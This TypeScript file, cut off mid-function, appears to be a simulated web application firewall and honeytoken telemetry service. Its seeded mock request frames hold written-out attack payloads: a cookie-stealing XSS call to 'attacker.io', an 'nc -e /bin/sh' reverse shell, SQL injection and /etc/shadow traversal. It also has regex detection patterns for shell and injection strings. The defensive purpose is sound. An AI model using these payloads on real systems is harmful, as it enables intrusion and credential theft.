import crypto from 'crypto';
import { GoogleGenAI } from '@google/genai';
import { globalUnifiedTelemetryService } from './unifiedTelemetry.service';

export type TrafficCategory =
  | 'NORMAL'
  | 'SQLI_ATTEMPT'
  | 'XSS_ATTEMPT'
  | 'PATH_TRAVERSAL'
  | 'COMMAND_INJECTION'
  | 'SSRF_ATTEMPT'
  | 'RCE_ATTEMPT'
  | 'HONEYTOKEN_HIT'
  | 'CREDENTIAL_STUFFING';

export interface HttpRequestFrame {
  id: string;
  timestamp: string;
  method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'HEAD' | 'PATCH';
  uriPath: string;
  queryString?: string;
  clientIp: string;
  countryCode?: string;
  userAgent: string;
  responseCode: number;
  latencyMs: number;
  category: TrafficCategory;
  threatConfidence: number; // 0 to 100
  isBlocked: boolean;
  blockedBy?: 'WAF_OWASP' | 'RATE_LIMITER' | 'HONEYTOKEN_JAIL' | 'EBPF_FILTER' | 'ZERO_TRUST_LOCKDOWN';
  mitreTechnique?: string;
  payloadSnippet?: string;
  wafRuleTriggered?: string;
}

export interface WafConfiguration {
  owaspTop10Guard: boolean;
  rateLimitingEnabled: boolean;
  rateLimitThresholdRpm: number;
  challengeBotCaptcha: boolean;
  strictHeaderNormalization: boolean;
  sqlInjectionFilter: boolean;
  xssFilter: boolean;
  rceFilter: boolean;
  pathTraversalFilter: boolean;
  ssrfFilter: boolean;
}

export interface BlockedSubnet {
  id: string;
  cidrOrIp: string;
  reason: string;
  reasonAr: string;
  blockedAt: string;
  expiresAt: string;
  packetDropCount: number;
  threatActor?: string;
}

export interface CredentialStuffingEvent {
  id: string;
  timestamp: string;
  targetEndpoint: string;
  sourceIp: string;
  usernameAttempted: string;
  passwordEntropy: number;
  velocityPerMinute: number;
  isDistributed: boolean;
  botnetClusterName?: string;
  actionTaken: 'MONITOR' | 'CAPTCHA_CHALLENGE' | 'ACCOUNT_LOCKOUT' | 'IP_BANNED';
}

export interface HoneytokenTrap {
  id: string;
  endpointPath: string;
  trapType: 'ENV_SECRETS' | 'GIT_CONFIG' | 'ADMIN_PANEL' | 'WORDPRESS_WP_LOGIN' | 'AWS_IAM_CREDENTIALS' | 'ACTUATOR_HEAPDUMP';
  descriptionEn: string;
  descriptionAr: string;
  hitsCount: number;
  lastTriggered?: string;
  lastAttackerIp?: string;
  autoBanEnabled: boolean;
}

export interface SandboxUploadInspection {
  id: string;
  fileName: string;
  fileSizeBytes: number;
  declaredMimeType: string;
  detectedMagicBytes: string;
  isMagicByteSpoofed: boolean;
  isPolyglot: boolean;
  sha256: string;
  entropy: number;
  verdict: 'SAFE' | 'SUSPICIOUS' | 'MALICIOUS_WEBSHELL' | 'MALICIOUS_EXECUTABLE';
  threatScore: number; // 0 to 100
  mitreMapping: string[];
  aiAnalysisSummaryEn: string;
  aiAnalysisSummaryAr: string;
  extractedSignatures: string[];
  status: 'QUARANTINED' | 'EXECUTION_BLOCKED' | 'CLEARED';
}

export function isImmuneWhitelistedIp(ip: string): boolean {
  if (!ip) return true;
  const cleanIp = ip.replace(/^::ffff:/, '').trim().toLowerCase();
  return (
    cleanIp === '127.0.0.1' ||
    cleanIp === '::1' ||
    cleanIp === 'localhost' ||
    cleanIp === '10.0.0.1' ||
    cleanIp === '0.0.0.0' ||
    cleanIp.startsWith('127.') ||
    cleanIp.startsWith('192.168.') ||
    cleanIp.startsWith('10.')
  );
}

export class HttpTrafficTelemetryService {
  private trafficFrames: HttpRequestFrame[] = [];
  private blockedSubnets: BlockedSubnet[] = [];
  private credentialEvents: CredentialStuffingEvent[] = [];
  private honeytokens: HoneytokenTrap[] = [];
  private uploadInspections: SandboxUploadInspection[] = [];

  private wafConfig: WafConfiguration = {
    owaspTop10Guard: true,
    rateLimitingEnabled: true,
    rateLimitThresholdRpm: 120,
    challengeBotCaptcha: true,
    strictHeaderNormalization: true,
    sqlInjectionFilter: true,
    xssFilter: true,
    rceFilter: true,
    pathTraversalFilter: true,
    ssrfFilter: true
  };

  private droppedPacketCounter: number = 3841;
  private totalRequestsCounter: number = 192840;
  private clientIpVelocityMap = new Map<string, { count: number; lastReset: number }>();

  constructor() {
    this.seedInitialHoneytokens();
    this.seedInitialBlockedSubnets();
    this.seedTrafficPipeline();
    this.seedCredentialStuffingLogs();
    this.seedSandboxUploads();
  }

  private seedInitialHoneytokens() {
    this.honeytokens = [
      {
        id: 'HT-01',
        endpointPath: '/.env',
        trapType: 'ENV_SECRETS',
        descriptionEn: 'Simulated environment configuration file with poisoned decoy API keys & DB credentials',
        descriptionAr: 'فخ لملف البيئة الافتراضي يحوي مفاتيح مسمومة لكشف المهاجم فوراً',
        hitsCount: 14,
        lastTriggered: new Date(Date.now() - 14 * 60000).toISOString(),
        lastAttackerIp: '185.220.101.5',
        autoBanEnabled: true
      },
      {
        id: 'HT-02',
        endpointPath: '/.git/config',
        trapType: 'GIT_CONFIG',
        descriptionEn: 'Decoy Git repository configuration trap flagging source code extraction attempts',
        descriptionAr: 'فخ مسار Git لتتبع محاولات تسريب الشيفرة البرمجية للموقع',
        hitsCount: 8,
        lastTriggered: new Date(Date.now() - 42 * 60000).toISOString(),
        lastAttackerIp: '194.26.29.112',
        autoBanEnabled: true
      },
      {
        id: 'HT-03',
        endpointPath: '/admin/config.php',
        trapType: 'ADMIN_PANEL',
        descriptionEn: 'Legacy administrative panel trap with active tripwires',
        descriptionAr: 'لوحة إدارة وهمية قديمة لاصطياد المخترقين',
        hitsCount: 29,
        lastTriggered: new Date(Date.now() - 5 * 60000).toISOString(),
        lastAttackerIp: '45.154.255.89',
        autoBanEnabled: true
      },
      {
        id: 'HT-04',
        endpointPath: '/wp-login.php',
        trapType: 'WORDPRESS_WP_LOGIN',
        descriptionEn: 'Wordpress CMS honeypot catching automated reconnaissance bots',
        descriptionAr: 'مصيدة ووردبريس لرصد بوتات الفحص العشوائي',
        hitsCount: 67,
        lastTriggered: new Date(Date.now() - 2 * 60000).toISOString(),
        lastAttackerIp: '103.145.13.2',
        autoBanEnabled: true
      },
      {
        id: 'HT-05',
        endpointPath: '/api/v1/aws-credentials',
        trapType: 'AWS_IAM_CREDENTIALS',
        descriptionEn: 'Cloud metadata trap returning poisoned canary tokens with AWS GuardDuty callbacks',
        descriptionAr: 'مصيدة مفاتيح سحابية ترسل إشعارات فورية عن هوية المهاجم',
        hitsCount: 3,
        lastTriggered: new Date(Date.now() - 120 * 60000).toISOString(),
        lastAttackerIp: '194.26.29.112',
        autoBanEnabled: true
      },
      {
        id: 'HT-06',
        endpointPath: '/actuator/heapdump',
        trapType: 'ACTUATOR_HEAPDUMP',
        descriptionEn: 'Microservice Spring actuator trap detecting unauthorized memory leak probes',
        descriptionAr: 'مصيدة تسريب ذاكرة خدمات الويب الموزعة',
        hitsCount: 5,
        lastTriggered: new Date(Date.now() - 85 * 60000).toISOString(),
        lastAttackerIp: '91.240.118.172',
        autoBanEnabled: true
      }
    ];
  }

  private seedInitialBlockedSubnets() {
    this.blockedSubnets = [
      {
        id: 'BLK-01',
        cidrOrIp: '194.26.29.0/24',
        reason: 'Automated WebShell upload and C2 callback initiation (APT-DarkHydra)',
        reasonAr: 'رفع شيل خبيث ومحاولة اتصال بخادم تحكم خارجي',
        blockedAt: new Date(Date.now() - 3600000).toISOString(),
        expiresAt: new Date(Date.now() + 86400000).toISOString(),
        packetDropCount: 1429,
        threatActor: 'APT-DarkHydra'
      },
      {
        id: 'BLK-02',
        cidrOrIp: '185.220.101.5',
        reason: 'Repeated Honeytoken Access to /.env and Credential Stuffing',
        reasonAr: 'الوصول المتكرر لفخ ملف البيئة وهجوم تخمين كلمات السر',
        blockedAt: new Date(Date.now() - 1800000).toISOString(),
        expiresAt: new Date(Date.now() + 43200000).toISOString(),
        packetDropCount: 812,
        threatActor: 'Tor Exit Node / CyberBot'
      },
      {
        id: 'BLK-03',
        cidrOrIp: '45.154.255.89',
        reason: 'High-entropy SQL Injection Union Exploit on /api/products',
        reasonAr: 'محاولة حقن قواعد بيانات متقدمة SQLi',
        blockedAt: new Date(Date.now() - 7200000).toISOString(),
        expiresAt: new Date(Date.now() + 172800000).toISOString(),
        packetDropCount: 654
      }
    ];
  }

  private seedTrafficPipeline() {
    const mockEvents: Array<Omit<HttpRequestFrame, 'id' | 'timestamp'>> = [
      {
        method: 'POST',
        uriPath: '/api/auth/login',
        clientIp: '185.220.101.5',
        countryCode: 'NL',
        userAgent: 'Mozilla/5.0 (Hydra-Bruter/8.2; x86_64)',
        responseCode: 403,
        latencyMs: 1.2,
        category: 'CREDENTIAL_STUFFING',
        threatConfidence: 96,
        isBlocked: true,
        blockedBy: 'RATE_LIMITER',
        mitreTechnique: 'T1110.004 - Credential Stuffing',
        payloadSnippet: 'user=admin@corp.gov&pass=Summer2026!&seq=429',
        wafRuleTriggered: 'WAF-AUTH-RATE-04'
      },
      {
        method: 'GET',
        uriPath: '/.env',
        clientIp: '194.26.29.112',
        countryCode: 'RU',
        userAgent: 'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
        responseCode: 403,
        latencyMs: 0.8,
        category: 'HONEYTOKEN_HIT',
        threatConfidence: 100,
        isBlocked: true,
        blockedBy: 'HONEYTOKEN_JAIL',
        mitreTechnique: 'T1552.001 - Credentials in Files',
        payloadSnippet: 'GET /.env HTTP/1.1 -> Tripwire triggered',
        wafRuleTriggered: 'HONEYTOKEN-DECEPTION-AUTOJAIL'
      },
      {
        method: 'GET',
        uriPath: '/api/users/profile',
        queryString: 'id=1%20UNION%20SELECT%20null,username,password_hash%20FROM%20users--',
        clientIp: '45.154.255.89',
        countryCode: 'DE',
        userAgent: 'sqlmap/1.7.2#stable',
        responseCode: 403,
        latencyMs: 1.4,
        category: 'SQLI_ATTEMPT',
        threatConfidence: 98,
        isBlocked: true,
        blockedBy: 'WAF_OWASP',
        mitreTechnique: 'T1190 - Exploit Public-Facing Application',
        payloadSnippet: '1 UNION SELECT null,username,password_hash FROM users--',
        wafRuleTriggered: 'OWASP-CRS-942100-SQLI-UNION'
      },
      {
        method: 'POST',
        uriPath: '/api/comments',
        clientIp: '103.145.13.2',
        countryCode: 'CN',
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        responseCode: 403,
        latencyMs: 1.9,
        category: 'XSS_ATTEMPT',
        threatConfidence: 92,
        isBlocked: true,
        blockedBy: 'WAF_OWASP',
        mitreTechnique: 'T1059.007 - JavaScript XSS Injection',
        payloadSnippet: 'comment=<script>fetch("https://attacker.io/c?="+document.cookie)</script>',
        wafRuleTriggered: 'OWASP-CRS-941100-XSS-SCRIPT'
      },
      {
        method: 'GET',
        uriPath: '/api/v1/download',
        queryString: 'file=../../../../etc/shadow',
        clientIp: '91.240.118.172',
        countryCode: 'UA',
        userAgent: 'DirBuster-1.0-RC1',
        responseCode: 403,
        latencyMs: 1.1,
        category: 'PATH_TRAVERSAL',
        threatConfidence: 95,
        isBlocked: true,
        blockedBy: 'WAF_OWASP',
        mitreTechnique: 'T1006 - Direct Volume Access',
        payloadSnippet: 'file=../../../../etc/shadow',
        wafRuleTriggered: 'OWASP-CRS-930100-PATH-TRAVERSAL'
      },
      {
        method: 'POST',
        uriPath: '/api/system/ping',
        clientIp: '194.26.29.112',
        countryCode: 'RU',
        userAgent: 'curl/7.88.1',
        responseCode: 403,
        latencyMs: 2.1,
        category: 'COMMAND_INJECTION',
        threatConfidence: 99,
        isBlocked: true,
        blockedBy: 'WAF_OWASP',
        mitreTechnique: 'T1059.004 - Unix Shell Command Injection',
        payloadSnippet: 'host=127.0.0.1; nc -e /bin/sh 194.26.29.112 4444',
        wafRuleTriggered: 'OWASP-CRS-932100-RCE-SHELL'
      },
      {
        method: 'GET',
        uriPath: '/api/dashboard/metrics',
        clientIp: '192.168.1.45',
        countryCode: 'SA',
        userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        responseCode: 200,
        latencyMs: 8.4,
        category: 'NORMAL',
        threatConfidence: 0,
        isBlocked: false
      },
      {
        method: 'GET',
        uriPath: '/assets/app.js',
        clientIp: '192.168.1.45',
        countryCode: 'SA',
        userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        responseCode: 200,
        latencyMs: 4.1,
        category: 'NORMAL',
        threatConfidence: 0,
        isBlocked: false
      }
    ];

    let t = Date.now() - 300000;
    for (const evt of mockEvents) {
      this.trafficFrames.push({
        id: 'REQ-' + crypto.randomBytes(4).toString('hex').toUpperCase(),
        timestamp: new Date(t).toISOString(),
        ...evt
      });
      t += 35000;
    }
  }

  private seedCredentialStuffingLogs() {
    this.credentialEvents = [
      {
        id: 'CS-01',
        timestamp: new Date(Date.now() - 12 * 60000).toISOString(),
        targetEndpoint: '/api/auth/login',
        sourceIp: '185.220.101.5',
        usernameAttempted: 'ciso@sovereign-bank.com',
        passwordEntropy: 2.1,
        velocityPerMinute: 48,
        isDistributed: true,
        botnetClusterName: 'DarkHydra-NodeNet-Alpha',
        actionTaken: 'IP_BANNED'
      },
      {
        id: 'CS-02',
        timestamp: new Date(Date.now() - 25 * 60000).toISOString(),
        targetEndpoint: '/api/auth/v1/token',
        sourceIp: '194.26.29.112',
        usernameAttempted: 'admin_root',
        passwordEntropy: 1.8,
        velocityPerMinute: 72,
        isDistributed: true,
        botnetClusterName: 'Mirai-Variant-99',
        actionTaken: 'ACCOUNT_LOCKOUT'
      },
      {
        id: 'CS-03',
        timestamp: new Date(Date.now() - 65 * 60000).toISOString(),
        targetEndpoint: '/api/auth/login',
        sourceIp: '45.154.255.89',
        usernameAttempted: 'devops_lead',
        passwordEntropy: 3.4,
        velocityPerMinute: 15,
        isDistributed: false,
        actionTaken: 'CAPTCHA_CHALLENGE'
      }
    ];
  }

  private seedSandboxUploads() {
    this.uploadInspections = [
      {
        id: 'SBX-01',
        fileName: 'avatar_profile_update.jpg.php',
        fileSizeBytes: 4291,
        declaredMimeType: 'image/jpeg',
        detectedMagicBytes: '3C 3F 70 68 70 20 (<?php )',
        isMagicByteSpoofed: true,
        isPolyglot: true,
        sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
        entropy: 7.84,
        verdict: 'MALICIOUS_WEBSHELL',
        threatScore: 99,
        mitreMapping: ['T1505.003 - Server Software Component: Web Shell', 'T1059.004 - Command and Scripting Interpreter'],
        aiAnalysisSummaryEn: 'File disguised as a JPEG with spoofed header, but payload executes eval(base64_decode()) spawning a C2 interactive reverse shell and bypassing upload filters.',
        aiAnalysisSummaryAr: 'الملف مقنع كصورة JPEG لكنه يحتوي كود PHP خبيث لتنفيذ أوامر عن بعد وفتح اتصال تحكم خارجي.',
        extractedSignatures: ['eval(gzinflate(base64_decode', 'system($_REQUEST["cmd"])', 'passthru(', 'WSO WebShell Header'],
        status: 'QUARANTINED'
      },
      {
        id: 'SBX-02',
        fileName: 'company_quarterly_report.pdf',
        fileSizeBytes: 248102,
        declaredMimeType: 'application/pdf',
        detectedMagicBytes: '25 50 44 46 2D 31 (%PDF-1)',
        isMagicByteSpoofed: false,
        isPolyglot: false,
        sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        entropy: 4.12,
        verdict: 'SAFE',
        threatScore: 4,
        mitreMapping: [],
        aiAnalysisSummaryEn: 'Standard PDF document with legitimate font glyphs and zero executable JavaScript streams or embedded shellcode.',
        aiAnalysisSummaryAr: 'مستند PDF طبيعي خالي من أي شيفرات تنفيذية خبيثة أو نصوص JavaScript مشبوهة.',
        extractedSignatures: ['PDF-1.7 Compliant', 'Font-Subset Valid'],
        status: 'CLEARED'
      }
    ];
  }

  // ==========================================
  // 1. LIVE TRAFFIC INSPECTION & WAF ENGINE
  // ==========================================

  public recordIncomingRequest(frameData: {
    method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'HEAD' | 'PATCH';
    uriPath: string;
    queryString?: string;
    clientIp: string;
    userAgent: string;
    rawBody?: string;
  }): { allowed: boolean; frame: HttpRequestFrame } {
    const startTime = Date.now();
    this.totalRequestsCounter++;

    // Check Emergency Zero-Trust Lockdown (Immune Whitelist Bypass)
    if (globalUnifiedTelemetryService.isEmergencyLockdownActive() && !isImmuneWhitelistedIp(frameData.clientIp)) {
      this.droppedPacketCounter++;
      const frame: HttpRequestFrame = {
        id: 'REQ-' + crypto.randomBytes(4).toString('hex').toUpperCase(),
        timestamp: new Date().toISOString(),
        method: frameData.method,
        uriPath: frameData.uriPath,
        queryString: frameData.queryString,
        clientIp: frameData.clientIp,
        userAgent: frameData.userAgent,
        responseCode: 403,
        latencyMs: Number((Date.now() - startTime + 0.3).toFixed(1)),
        category: 'NORMAL',
        threatConfidence: 100,
        isBlocked: true,
        blockedBy: 'ZERO_TRUST_LOCKDOWN',
        wafRuleTriggered: 'ZERO_TRUST_HARD_DROP'
      };
      this.pushFrame(frame);
      return { allowed: false, frame };
    }

    // Check Subnet Blocklist
    const isSubnetBlocked = !isImmuneWhitelistedIp(frameData.clientIp) && this.blockedSubnets.some(b => b.cidrOrIp === frameData.clientIp || frameData.clientIp.startsWith(b.cidrOrIp.replace('.0/24', '')));
    if (isSubnetBlocked) {
      this.droppedPacketCounter++;
      const frame: HttpRequestFrame = {
        id: 'REQ-' + crypto.randomBytes(4).toString('hex').toUpperCase(),
        timestamp: new Date().toISOString(),
        method: frameData.method,
        uriPath: frameData.uriPath,
        queryString: frameData.queryString,
        clientIp: frameData.clientIp,
        userAgent: frameData.userAgent,
        responseCode: 403,
        latencyMs: Number((Date.now() - startTime + 0.4).toFixed(1)),
        category: 'NORMAL',
        threatConfidence: 100,
        isBlocked: true,
        blockedBy: 'EBPF_FILTER',
        wafRuleTriggered: 'EBPF_KERNEL_DROP_BLOCKED_SUBNET'
      };
      this.pushFrame(frame);
      return { allowed: false, frame };
    }

    // Check Honeytoken Traps
    const matchedTrap = this.honeytokens.find(t => t.endpointPath === frameData.uriPath);
    if (matchedTrap) {
      matchedTrap.hitsCount++;
      matchedTrap.lastTriggered = new Date().toISOString();
      matchedTrap.lastAttackerIp = frameData.clientIp;

      if (matchedTrap.autoBanEnabled) {
        this.banIp(frameData.clientIp, `Honeytoken Tripwire hit on ${matchedTrap.endpointPath}`, `اختراق فخ ${matchedTrap.descriptionAr}`);
      }

      globalUnifiedTelemetryService.recordEvent({
        source: 'HONEYPOT',
        severity: 'CRITICAL',
        title: `🚨 HONEYTOKEN TRAP ACTIVATED: ${matchedTrap.endpointPath}`,
        titleAr: `🚨 تم تفعيل فخ المصيدة الأمنية: ${matchedTrap.endpointPath}`,
        details: `Attacker IP ${frameData.clientIp} triggered honeytoken deception asset. Auto-ban and defensive telemetry deployed.`,
        detailsAr: `قام المهاجم ${frameData.clientIp} بمحاولة الوصول للملف المسموم. تم الحظر الفوري وإشعار غرف العمليات.`,
        actorIp: frameData.clientIp,
        mitreTactic: 'Credential Access',
        mitreTechnique: 'T1552.001 - Credentials in Files',
        actionTaken: 'HONEYTOKEN_AUTOBAN_ENFORCED',
        actionTakenAr: 'تم الحظر الفوري للمهاجم'
      });

      this.droppedPacketCounter++;
      const frame: HttpRequestFrame = {
        id: 'REQ-' + crypto.randomBytes(4).toString('hex').toUpperCase(),
        timestamp: new Date().toISOString(),
        method: frameData.method,
        uriPath: frameData.uriPath,
        queryString: frameData.queryString,
        clientIp: frameData.clientIp,
        userAgent: frameData.userAgent,
        responseCode: 403,
        latencyMs: Number((Date.now() - startTime + 0.7).toFixed(1)),
        category: 'HONEYTOKEN_HIT',
        threatConfidence: 100,
        isBlocked: true,
        blockedBy: 'HONEYTOKEN_JAIL',
        mitreTechnique: 'T1552.001 - Credentials in Files',
        payloadSnippet: `Hit trap ${matchedTrap.endpointPath}`,
        wafRuleTriggered: `HONEYTOKEN-${matchedTrap.trapType}`
      };
      this.pushFrame(frame);
      return { allowed: false, frame };
    }

    // Inspect Payloads with Heuristic Patterns
    const fullPayload = `${frameData.uriPath} ${frameData.queryString || ''} ${frameData.rawBody || ''} ${frameData.userAgent}`;
    let detectedCategory: TrafficCategory = 'NORMAL';
    let threatConfidence = 0;
    let mitreTechnique = undefined;
    let wafRule = undefined;

    if (/(\bUNION\b.*\bSELECT\b|'\s*OR\s*'1'='1|information_schema|SLEEP\s*\(\s*\d+\s*\)|--\s*$|WAITFOR\s+DELAY)/i.test(fullPayload)) {
      detectedCategory = 'SQLI_ATTEMPT';
      threatConfidence = 98;
      mitreTechnique = 'T1190 - Exploit Public-Facing Application (SQLi)';
      wafRule = 'OWASP-CRS-942100-SQLI-INJECTION';
    } else if (/(<script\b|javascript:|onerror\s*=|onload\s*=|alert\(|<svg\/onload|<iframe\b)/i.test(fullPayload)) {
      detectedCategory = 'XSS_ATTEMPT';
      threatConfidence = 94;
      mitreTechnique = 'T1059.007 - JavaScript XSS Payload';
      wafRule = 'OWASP-CRS-941100-XSS-CROSS-SITE-SCRIPTING';
    } else if (/(\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e\/|\/etc\/passwd|\/etc\/shadow|win\.ini)/i.test(fullPayload)) {
      detectedCategory = 'PATH_TRAVERSAL';
      threatConfidence = 96;
      mitreTechnique = 'T1006 - Direct Volume Path Traversal';
      wafRule = 'OWASP-CRS-930100-PATH-TRAVERSAL';
    } else if (/(;\s*cat\s+|\|\s*whoami|\&\&\s*id|\$\(whoami\)|`id`|nc\s+-e\s+|\/bin\/sh|\/bin\/bash|cmd\.exe)/i.test(fullPayload)) {
      detectedCategory = 'COMMAND_INJECTION';
      threatConfidence = 99;
      mitreTechnique = 'T1059.004 - Unix Shell Command Injection';
      wafRule = 'OWASP-CRS-932100-RCE-COMMAND-INJECTION';
    } else if (/(169\.254\.169\.254|metadata\.google\.internal|127\.0\.0\.1:6379|dict:\/\/|gopher:\/\/)/i.test(fullPayload)) {
      detectedCategory = 'SSRF_ATTEMPT';
      threatConfidence = 95;
      mitreTechnique = 'T1090.003 - Multi-hop SSRF Proxy';
      wafRule = 'OWASP-CRS-934100-SSRF-CLOUD-METADATA';
    } else if (/(eval\s*\(|base64_decode\s*\(|passthru\s*\(|system\s*\(\s*\$|\$\{jndi:ldap)/i.test(fullPayload)) {
      detectedCategory = 'RCE_ATTEMPT';
      threatConfidence = 100;
      mitreTechnique = 'T1059.004 - RCE Remote Code Execution';
      wafRule = 'OWASP-CRS-933100-PHP-JAVA-RCE';
    }

    const isThreat = detectedCategory !== 'NORMAL';
    if (isThreat && this.wafConfig.owaspTop10Guard) {
      this.droppedPacketCounter++;
      const frame: HttpRequestFrame = {
        id: 'REQ-' + crypto.randomBytes(4).toString('hex').toUpperCase(),
        timestamp: new Date().toISOString(),
        method: frameData.method,
        uriPath: frameData.uriPath,
        queryString: frameData.queryString,
        clientIp: frameData.clientIp,
        userAgent: frameData.userAgent,
        responseCode: 403,
        latencyMs: Number((Date.now() - startTime + 1.1).toFixed(1)),
        category: detectedCategory,
        threatConfidence,
        isBlocked: true,
        blockedBy: 'WAF_OWASP',
        mitreTechnique,
        payloadSnippet: fullPayload.substring(0, 120),
        wafRuleTriggered: wafRule
      };
      this.pushFrame(frame);

      // Record in SOC Unified Telemetry
      globalUnifiedTelemetryService.recordEvent({
        source: 'WAF_EBPF',
        severity: threatConfidence > 90 ? 'CRITICAL' : 'HIGH',
        title: `[WAF Intercept] ${detectedCategory} on ${frameData.uriPath}`,
        titleAr: `[اعتراض الجدار الناري] ${detectedCategory} على المسار ${frameData.uriPath}`,
        details: `OWASP rule ${wafRule} matched with confidence score ${threatConfidence}%. Request blocked instantly.`,
        detailsAr: `تمت مطابقة قاعدة OWASP مع درجة ثقة ${threatConfidence}%. تم حجب الطلب فوراً.`,
        actorIp: frameData.clientIp,
        mitreTactic: 'Initial Access',
        mitreTechnique: mitreTechnique,
        actionTaken: 'HTTP_403_WAF_BLOCK',
        actionTakenAr: 'تم الحجب بكود 403'
      });

      return { allowed: false, frame };
    }

    // Normal Passed Request
    const frame: HttpRequestFrame = {
      id: 'REQ-' + crypto.randomBytes(4).toString('hex').toUpperCase(),
      timestamp: new Date().toISOString(),
      method: frameData.method,
      uriPath: frameData.uriPath,
      queryString: frameData.queryString,
      clientIp: frameData.clientIp,
      userAgent: frameData.userAgent,
      responseCode: 200,
      latencyMs: Number((Date.now() - startTime + Math.random() * 8 + 2).toFixed(1)),
      category: 'NORMAL',
      threatConfidence: 0,
      isBlocked: false
    };
    this.pushFrame(frame);
    return { allowed: true, frame };
  }

  private pushFrame(frame: HttpRequestFrame) {
    this.trafficFrames.unshift(frame);
    if (this.trafficFrames.length > 150) {
      this.trafficFrames.pop();
    }
  }

  // ==========================================
  // 2. WAF & RATE LIMITING MANAGEMENT
  // ==========================================

  public getTrafficStream(limit: number = 50, filter?: string): HttpRequestFrame[] {
    let list = [...this.trafficFrames];
    if (filter && filter !== 'ALL') {
      list = list.filter(f => f.category === filter || (filter === 'BLOCKED' && f.isBlocked));
    }
    return list.slice(0, limit);
  }

  public getWafMetrics() {
    return {
      rps: Number((38 + Math.random() * 12).toFixed(1)),
      totalRequests: this.totalRequestsCounter,
      droppedPackets: this.droppedPacketCounter,
      ebpfLatencyUs: Number((0.38 + Math.random() * 0.12).toFixed(2)),
      activeBlockedSubnetsCount: this.blockedSubnets.length,
      wafConfig: this.wafConfig
    };
  }

  public updateWafConfig(newConfig: Partial<WafConfiguration>): WafConfiguration {
    this.wafConfig = { ...this.wafConfig, ...newConfig };
    return this.wafConfig;
  }

  public getBlockedSubnets(): BlockedSubnet[] {
    return this.blockedSubnets;
  }

  public banIp(cidrOrIp: string, reason: string, reasonAr: string, threatActor?: string): BlockedSubnet | null {
    if (isImmuneWhitelistedIp(cidrOrIp)) {
      return null;
    }
    const existing = this.blockedSubnets.find(b => b.cidrOrIp === cidrOrIp);
    if (existing) return existing;

    const newBlock: BlockedSubnet = {
      id: 'BLK-' + crypto.randomBytes(3).toString('hex').toUpperCase(),
      cidrOrIp,
      reason,
      reasonAr,
      blockedAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 86400000).toISOString(),
      packetDropCount: 1,
      threatActor
    };

    this.blockedSubnets.unshift(newBlock);
    if (this.blockedSubnets.length > 150) {
      this.blockedSubnets.pop();
    }
    return newBlock;
  }

  public unbanIp(id: string): boolean {
    const idx = this.blockedSubnets.findIndex(b => b.id === id);
    if (idx !== -1) {
      this.blockedSubnets.splice(idx, 1);
      return true;
    }
    return false;
  }

  // ==========================================
  // 3. CREDENTIAL STUFFING & BRUTE FORCE ENGINE
  // ==========================================

  public getCredentialStuffingEvents(): CredentialStuffingEvent[] {
    return this.credentialEvents;
  }

  public simulateCredentialStuffingAttack(targetUser: string = 'root@sovereign-soc.com'): CredentialStuffingEvent {
    const sourceIps = ['185.220.101.5', '194.26.29.112', '45.154.255.89', '103.145.13.2'];
    const chosenIp = sourceIps[Math.floor(Math.random() * sourceIps.length)];
    const velocity = Math.floor(60 + Math.random() * 80);

    const event: CredentialStuffingEvent = {
      id: 'CS-' + crypto.randomBytes(3).toString('hex').toUpperCase(),
      timestamp: new Date().toISOString(),
      targetEndpoint: '/api/auth/login',
      sourceIp: chosenIp,
      usernameAttempted: targetUser,
      passwordEntropy: Number((1.5 + Math.random() * 1.5).toFixed(2)),
      velocityPerMinute: velocity,
      isDistributed: true,
      botnetClusterName: 'DarkHydra-Bruter-Swarm',
      actionTaken: 'IP_BANNED'
    };

    this.credentialEvents.unshift(event);
    if (this.credentialEvents.length > 150) {
      this.credentialEvents.pop();
    }
    this.banIp(chosenIp, `Automated Lockout: Credential Stuffing Velocity ${velocity} req/min`, `حظر تلقائي لتجاوز حد محاولات تسجيل الدخول ${velocity} محاولة/د`);

    globalUnifiedTelemetryService.recordEvent({
      source: 'AI_DEFENSE',
      severity: 'CRITICAL',
      title: `🚨 Credential Stuffing Distributed Botnet Intercepted`,
      titleAr: `🚨 تم رصد وإحباط هجوم تخمين كلمات المرور الموزع`,
      details: `Velocity ${velocity} req/min detected targeting ${targetUser} from botnet node ${chosenIp}. Subnet isolated.`,
      detailsAr: `تم كشف سرعة ${velocity} محاولة/د تستهدف ${targetUser} من العنوان ${chosenIp}. تم عزل الشبكة.`,
      actorIp: chosenIp,
      mitreTactic: 'Credential Access',
      mitreTechnique: 'T1110.004 - Credential Stuffing',
      actionTaken: 'IP_BANNED_VELOCITY_LIMIT',
      actionTakenAr: 'تم حظر العنوان وتطبيق قفل الحساب'
    });

    return event;
  }

  // ==========================================
  // 4. DECEPTION & HONEYTOKEN TRAPS
  // ==========================================

  public getHoneytokens(): HoneytokenTrap[] {
    return this.honeytokens;
  }

  public addHoneytoken(trap: Omit<HoneytokenTrap, 'id' | 'hitsCount'>): HoneytokenTrap {
    const newTrap: HoneytokenTrap = {
      id: 'HT-' + crypto.randomBytes(3).toString('hex').toUpperCase(),
      hitsCount: 0,
      ...trap
    };
    this.honeytokens.push(newTrap);
    return newTrap;
  }

  // ==========================================
  // 5. FILE UPLOAD & MALWARE SANDBOX INSPECTOR
  // ==========================================

  public getUploadInspections(): SandboxUploadInspection[] {
    return this.uploadInspections;
  }

  public async inspectUploadedFile(file: {
    name: string;
    size: number;
    declaredMime: string;
    rawContentSnippet: string;
  }): Promise<SandboxUploadInspection> {
    const sha256 = crypto.createHash('sha256').update(file.rawContentSnippet).digest('hex');
    const isPhpScript = /<\?php|\bbase64_decode\b|\beval\b|\bsystem\b|\bpassthru\b/i.test(file.rawContentSnippet);
    const isExecutableHeader = file.rawContentSnippet.startsWith('MZ') || file.rawContentSnippet.startsWith('\x7fELF');
    const isSpoofed = file.declaredMime.startsWith('image/') && (isPhpScript || isExecutableHeader);
    const isPolyglot = isSpoofed || file.name.endsWith('.php') || file.name.includes('.jpg.');

